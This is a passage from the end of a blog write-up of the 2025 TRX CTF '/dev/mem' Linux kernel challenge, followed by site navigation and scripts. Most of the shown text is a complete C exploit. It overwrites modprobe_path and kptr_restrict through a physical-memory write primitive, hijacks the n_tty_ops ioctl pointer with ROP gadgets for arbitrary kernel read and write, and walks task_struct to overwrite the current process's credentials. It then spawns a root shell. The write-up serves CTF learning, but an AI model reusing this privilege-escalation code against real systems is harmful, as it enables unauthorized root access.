class="type">u_int64_t</span> kptr_restrict_offset = <span class="number">0x1ff49e0</span>;</span><br><span class="line"><span class="type">u_int64_t</span> modprobe_path_offset = <span class="number">0x1dc6c20</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> n_tty_ioctl_offset = <span class="number">0x1eff4e0</span> + <span class="number">0x38</span>; <span class="comment">// n_tty_ops + 0x38</span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> mov_rdx_to_rax_offset = <span class="number">0xe94f2b</span>; <span class="comment">// aar gadget</span></span><br><span class="line"><span class="type">u_int64_t</span> mov_esi_to_rdx_offset = <span class="number">0x1084c7a</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> origin_ioctl_pointer_offset = <span class="number">0xc786c0</span>; <span class="comment">// origin n_tty_ops ioctl pointer</span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> INIT_TASK_offset = <span class="number">0x1c0d0c0</span>;</span><br><span class="line"><span class="type">u_int64_t</span> INIT_TASK = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> mov_rdx_to_rax = <span class="number">0</span>;</span><br><span class="line"><span class="type">u_int64_t</span> mov_esi_to_rdx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pid_offset 0x9d0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> cred_offset 0xbe0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> tasks_offset 0x900</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0xffffffff81e94f2b: mov rax, [rdx]; ret;</span></span><br><span class="line"><span class="comment">0xffffffff82084c7a: mov [rdx], esi; ret;</span></span><br><span class="line"><span class="comment">0xffffffff82c0d0c0 T init_task</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_phy</span><span class="params">(<span class="type">u_int64_t</span> address, <span class="type">u_int64_t</span> value)</span>&#123;</span><br><span class="line">    <span class="type">char</span> command[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(command, <span class="string">&quot;/usr/sbin/chall 0x%lx 0x%lx&quot;</span>, address, value);</span><br><span class="line">    <span class="built_in">puts</span>(command);</span><br><span class="line">    system(command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check_modprobepath</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(buf, <span class="number">0x50</span>, <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(buf, <span class="string">&quot;/usr/sbin/modprobe\n&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[!] Find kernel physical base\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_kptr_restrict</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;echo [!]kptr_restrict:$(cat /proc/sys/kernel/kptr_restrict)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cat_kallsyms</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    fp = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening /proc/kallsyms&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;modprobe_path&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx&quot;</span>, &amp;kernel_virtual_base);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_virtual_base = kernel_virtual_base - modprobe_path_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kernel_virtual_base != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel Virtual base : 0x%lx\n&quot;</span>, kernel_virtual_base);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path not found\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int32_t</span> <span class="title function_">aar_virtual_memory_4</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> cmd, <span class="type">u_int64_t</span> w_r_address)</span>&#123;</span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, mov_rdx_to_rax);</span><br><span class="line">    <span class="type">u_int32_t</span> retval;</span><br><span class="line">    retval = ioctl(fd, cmd, w_r_address);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> <span class="title function_">aar_virtual_memory_8</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> cmd, <span class="type">u_int64_t</span> w_r_address)</span>&#123;</span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, mov_rdx_to_rax);</span><br><span class="line">    <span class="type">u_int64_t</span> retval1;</span><br><span class="line">    <span class="type">u_int64_t</span> retval2;</span><br><span class="line">    <span class="type">u_int64_t</span> retval;</span><br><span class="line">    retval1 = ioctl(fd, cmd, w_r_address);</span><br><span class="line">    retval2 = ioctl(fd, cmd, w_r_address + <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">    retval = retval1 + (retval2 &lt;&lt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">aaw_virtual_memory_4</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> cmd, <span class="type">u_int64_t</span> w_w_address)</span>&#123;</span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, mov_esi_to_rdx);</span><br><span class="line">    ioctl(fd, cmd, w_w_address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recover_ioctl_pointer</span><span class="params">()</span>&#123;</span><br><span class="line">    write_phy(kernel_physical_base + n_tty_ioctl_offset, kernel_virtual_base + origin_ioctl_pointer_offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">u_int64_t</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">u_int64_t</span> my_pid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        write_phy(modprobe_start, tmpa);</span><br><span class="line">        <span class="keyword">if</span> (check_modprobepath() == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel physical modprobe : 0x%lx\n&quot;</span>, modprobe_start);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        modprobe_start -= <span class="number">0x100000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_physical_base = modprobe_start - <span class="number">0x1dc6c20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Kernel physical base : 0x%lx\n&quot;</span>, kernel_physical_base);</span><br><span class="line"></span><br><span class="line">    write_phy(kernel_physical_base + kptr_restrict_offset, <span class="number">0</span>);</span><br><span class="line">    check_kptr_restrict();</span><br><span class="line">    cat_kallsyms();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;==== leak end ====&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    my_pid = getpid();</span><br><span class="line"></span><br><span class="line">    mov_rdx_to_rax = mov_rdx_to_rax_offset + kernel_virtual_base;</span><br><span class="line">    mov_esi_to_rdx = mov_esi_to_rdx_offset + kernel_virtual_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] mov rax, [rdx] (AAR gadget) : %lx \n&quot;</span>, mov_rdx_to_rax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] mov [rdx], esi (AAW gadget) : %lx \n&quot;</span>, mov_esi_to_rdx);</span><br><span class="line"></span><br><span class="line">    <span class="type">u_int64_t</span> curr_task = <span class="number">0</span>;</span><br><span class="line">    <span class="type">u_int64_t</span> curr_pid = <span class="number">0</span>;</span><br><span class="line">    <span class="type">u_int64_t</span> target_task = <span class="number">0</span>;</span><br><span class="line">    <span class="type">u_int64_t</span> target_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    INIT_TASK = INIT_TASK_offset + kernel_virtual_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] init_task : %lx\n&quot;</span>, INIT_TASK);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_NOCTTY | O_RDONLY);</span><br><span class="line"></span><br><span class="line">    curr_task = INIT_TASK;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(curr_pid != my_pid)&#123;</span><br><span class="line">        curr_task = aar_virtual_memory_8(fd, <span class="number">0</span>, curr_task + tasks_offset) - tasks_offset;    </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>, curr_task);</span><br><span class="line">        curr_pid = aar_virtual_memory_4(fd, <span class="number">0</span>, curr_task + pid_offset);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, curr_pid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    target_task = curr_task;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Get Target Task: %lx (%ld, %ld)\n&quot;</span>, target_task, curr_pid, my_pid);</span><br><span class="line"></span><br><span class="line">    target_cred = aar_virtual_memory_8(fd, <span class="number">0</span>, target_task + cred_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target cred : %lx \n&quot;</span>, target_cred);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    aaw_virtual_memory_4(fd, <span class="number">0</span>, target_cred + <span class="number">4</span>);</span><br><span class="line">    aaw_virtual_memory_4(fd, <span class="number">0</span>, target_cred + <span class="number">8</span>);</span><br><span class="line">    aaw_virtual_memory_4(fd, <span class="number">0</span>, target_cred + <span class="number">12</span>);</span><br><span class="line">    aaw_virtual_memory_4(fd, <span class="number">0</span>, target_cred + <span class="number">16</span>);</span><br><span class="line">    aaw_virtual_memory_4(fd, <span class="number">0</span>, target_cred + <span class="number">20</span>);</span><br><span class="line">    aaw_virtual_memory_4(fd, <span class="number">0</span>, target_cred + <span class="number">24</span>);</span><br><span class="line">    aaw_virtual_memory_4(fd, <span class="number">0</span>, target_cred + <span class="number">28</span>);</span><br><span class="line">    aaw_virtual_memory_4(fd, <span class="number">0</span>, target_cred + <span class="number">32</span>);</span><br><span class="line">    aaw_virtual_memory_4(fd, <span class="number">0</span>, target_cred + <span class="number">36</span>);</span><br><span class="line"></span><br><span class="line">    recover_ioctl_pointer();</span><br><span class="line">    getshell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h2 id="after-all"><a href="#after-all" class="headerlink" title="after all"></a>after all</h2><p>學到非常多，拿到了 physical address 任意寫不一定很好 exploit<br>其中還需要 leak 很多東西，另外在 modprobe 這條鏈不能用的情況下，可以去 traverse task 來 overwrite 對應的 cred</p>

      
    </div>
    <footer class="article-footer">
      
      
      
      
      
      
      
      
      

    </footer>
  </div>
  
  <nav id="article-nav" data-aos="fade-up">
    
      <div class="article-nav-link-wrap article-nav-link-left">
        
          <img data-src="/images/posts_cover/Linux-Kernel-CPU-and-physical-memory/Archlinux_chan.png" data-sizes="auto" alt="Linux Kernel - Traversal of CPU and physical memory management" class="lazyload">
        
        <a href="/2025/04/18/Linux-Kernel-Traversal-of-CPUandPhysical-memory-management/"></a>
        <div class="article-nav-caption">Newer</div>
        <h3 class="article-nav-title">
          
            Linux Kernel - Traversal of CPU and physical memory management
          
        </h3>
      </div>
    
    
    <div class="article-nav-link-wrap article-nav-link-right">
      
        <img data-src="/images/posts_cover/LinuxKernelPwn/linuxkernel.png" data-sizes="auto" alt="Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf" class="lazyload">
      
      <a href="/2025/04/04/Linux-Kernel-modprobe-EoP-and-2021-3kctf-echo-nerf/"></a>
      <div class="article-nav-caption">Older</div>
      <h3 class="article-nav-title">
        
          Linux Kernel - EoP by modprobe &amp; 2021 3kCTF echo nerf
        
      </h3>
    </div>
    
  </nav>


</article>






</section>
        </div>
        
        
        <footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
    <div>
      <span class="icon-copyright"></span>
      2020-2025
      <span class="footer-info-sep rotate"></span>
      Naup堇姬
    </div>
    
      <div>
        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
      </div>
    
    
      <div>
        <span class="icon-brush"></span>
        197.5k
        &nbsp;|&nbsp;
        <span class="icon-coffee"></span>
        17:12
      </div>
    
    
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
      </div>
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2025-TRX-CTF-dev-mem"><span class="toc-number">1.</span> <span class="toc-text">2025 TRX CTF - &#x2F;dev&#x2F;mem</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">前置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#analyze-code"><span class="toc-number">1.2.</span> <span class="toc-text">analyze code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#modprobe-not-be-use"><span class="toc-number">1.2.1.</span> <span class="toc-text">modprobe not be use</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#broken-KASLR"><span class="toc-number">1.3.</span> <span class="toc-text">broken KASLR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#physical-base-address"><span class="toc-number">1.3.1.</span> <span class="toc-text">physical base address</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-physical-and-Virtual-base-relation"><span class="toc-number">1.3.2.</span> <span class="toc-text">Kernel physical and Virtual base relation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KASLR-physical-address"><span class="toc-number">1.3.3.</span> <span class="toc-text">KASLR physical address</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#virtual-address-base"><span class="toc-number">1.3.4.</span> <span class="toc-text">virtual address base</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Control-RIP"><span class="toc-number">1.4.</span> <span class="toc-text">Control RIP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-TTY-device"><span class="toc-number">1.4.1.</span> <span class="toc-text">What is TTY device</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pty-%E8%99%9B%E6%93%AC%E7%B5%82%E7%AB%AF"><span class="toc-number">1.4.2.</span> <span class="toc-text">pty (虛擬終端)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dev-ptmx"><span class="toc-number">1.4.3.</span> <span class="toc-text">&#x2F;dev&#x2F;ptmx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#source-code-about-ptmx"><span class="toc-number">1.4.4.</span> <span class="toc-text">source code about ptmx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#n-tty-ops"><span class="toc-number">1.4.5.</span> <span class="toc-text">n_tty_ops</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AE%80"><span class="toc-number">1.5.</span> <span class="toc-text">任意讀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kernel-memory-%E4%BB%BB%E6%84%8F%E8%AE%80"><span class="toc-number">1.5.1.</span> <span class="toc-text">kernel memory 任意讀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%9D%91%E9%BB%9E%E7%9A%84-kernel-panic"><span class="toc-number">1.5.2.</span> <span class="toc-text">小坑點的 kernel panic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-%E4%BB%BB%E6%84%8F%E8%AE%80"><span class="toc-number">1.5.3.</span> <span class="toc-text">exploit 任意讀</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EoP"><span class="toc-number">1.6.</span> <span class="toc-text">EoP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#init-process"><span class="toc-number">1.6.1.</span> <span class="toc-text">init process</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task-struct"><span class="toc-number">1.6.2.</span> <span class="toc-text">task_struct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE-offset-%E5%95%8F%E9%A1%8C"><span class="toc-number">1.6.3.</span> <span class="toc-text">找 offset 問題</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EoP-success"><span class="toc-number">1.6.4.</span> <span class="toc-text">EoP success</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">1.7.</span> <span class="toc-text">demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">1.8.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-all"><span class="toc-number">1.9.</span> <span class="toc-text">after all</span></a></li></ol></li></ol>
      
  </div>
</div>
</div>
      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
  <div class="sidebar-author-name">Naup堇姬</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">79</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">21</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-email sidebar-social-icon">
      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
    </div>
  
    <div class="icon-github sidebar-social-icon">
      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Home</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Archives</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">About</div>
      </div>
    
  
</div>
</div>
    
  </div>
  
    <div class="sidebar-btn-wrapper">
      <div class="sidebar-toc-btn current"></div>
      <div class="sidebar-common-btn"></div>
    </div>
  
</nav>

    </div>
    
    
<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>


<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>



<script src="/js/script.js"></script>



  
<script src="/js/aos.js"></script>

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', aosInit);
    } else {
      aosInit();
    }
  </script>



<script src="/js/pjax_script.js" data-pjax></script>







  
<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>

  <script>
    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
  </script>










<div id="lazy-script">
  <div>
    
      
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "Naup堇姬",
          title: "2025 TRX CTF - /dev/mem",
          url: "http://example.com/2025/04/11/Linux-Kernel-2025-TRX-CTF-devmem/",
          excerpt: "",
          description: "",
          stripContent: "2025 TRX CTF - &amp;#x2F;dev&amp;#x2F;mem Author : 堇姬 Naup  前置123mkdir -p sysfilegunzip initramfs.cpio.gzcpio -idmv -D sysfile &amp;lt; initramfs.cpio  把 cpio 解壓後，先把 pack.sh 寫好 之後來修 run.sh 123456789101112131415161718192021222324252627282930313233naup@naup-virtua",
          date: "Fri Apr 11 2025 18:42:52 GMT+0800",
          updated: "Wed May 14 2025 18:35:43 GMT+0800",
          cover: "/images/posts_cover/trxctf/TRXCTF.png",
        };
      </script>
       
    
    
      
        
<script src="/js/insert_highlight.js" data-pjax></script>

        
      
    
    
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
        
        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      








    
  </div>
</div>


  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  



  
<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>




<script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then((registrations) => {
      for (let registration of registrations) {
        registration.unregister();
      }
    });
  }
</script>







  </body>
  </html>

